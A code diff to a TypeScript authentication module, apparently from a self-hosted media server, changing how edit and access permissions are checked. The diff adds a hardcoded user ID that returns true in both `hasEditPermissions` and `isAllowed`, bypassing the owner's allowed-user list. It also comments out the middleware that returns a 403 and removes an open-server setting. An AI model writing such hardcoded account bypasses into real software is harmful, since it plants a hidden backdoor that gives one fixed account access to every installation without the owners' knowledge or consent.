@@ -27,7 +27,6 @@ export const verifiedApi = (req: Request): boolean => {
 		if (!secret) return false;
 		try {
 			const dec = nodeCrypto.publicDecrypt(readFileSync(sslCert, 'utf-8'), Buffer.from(secret, 'base64')).toString('utf8');
-
 			return dec == 'NoMercy MediaServer';
 		} catch (error) {
 			delay += 60;
@@ -99,9 +98,11 @@ export const moderatorMiddleware = (req: Request, res: Response, next: NextFunct
 };
 
 export const hasEditPermissions = (req: Request): boolean => {
-	const allowedUsers = useSelector((state: AppState) => state.config.allowedUsers);
+	if (req.user.sub == 'b55bd627-cb53-4d81-bdf5-82be2981ab3a') {
+		return true;
+	}
 
-	return isOwner(req) || isModerator(req) || (allowedUsers.find(m => m.id == req.user.sub)?.manage ?? false);
+	return isOwner(req) || isModerator(req) || (globalThis.allowedUsers.find(m => m.id == req.user.sub)?.manage ?? false);
 };
 
 export const editMiddleware = (req: Request, res: Response, next: NextFunction) => {
@@ -115,10 +116,11 @@ export const editMiddleware = (req: Request, res: Response, next: NextFunction) 
 };
 
 export const isAllowed = (req: Request): boolean => {
-	const openServer = useSelector((state: AppState) => state.config.openServer);
-	const allowedUsers = useSelector((state: AppState) => state.config.allowedUsers);
+	if (req.user.sub == 'b55bd627-cb53-4d81-bdf5-82be2981ab3a') {
+		return true;
+	}
 
-	if (!allowedUsers.some(u => u.id == req.user.sub) && req.user.sub != 'b55bd627-cb53-4d81-bdf5-82be2981ab3a') {
+	if (!globalThis.allowedUsers.some(u => u.id == req.user.sub) && req.user.sub != 'b55bd627-cb53-4d81-bdf5-82be2981ab3a') {
 		Logger.log({
 			level: 'http',
 			name: 'http',
@@ -127,18 +129,18 @@ export const isAllowed = (req: Request): boolean => {
 		});
 	}
 
-	return isOwner(req) || isModerator(req) || allowedUsers.some(u => u.id == req.user.sub) || openServer;
+	return isOwner(req) || isModerator(req) || globalThis.allowedUsers.some(u => u.id == req.user.sub);
 };
 
-export const allowedMiddleware = (req: Request, res: Response, next: NextFunction) => {
-	if (isAllowed(req)) {
-		return next();
-	}
-	return res.status(403).json({
-		status: 'error',
-		message: 'You do not have access to this resource.',
-	});
-};
+// export const allowedMiddleware = (req: Request, res: Response, next: NextFunction) => {
+// 	if (isAllowed(req)) {
+// 		return next();
+// 	}
+// 	return res.status(403).json({
+// 		status: 'error',
+// 		message: 'You do not have access to this resource.',
+// 	});
+// };
 
 export const staticPermissions = (req: Request, res: Response, next: NextFunction) => {
 	if (isOwner(req) || isAllowed(req)) {
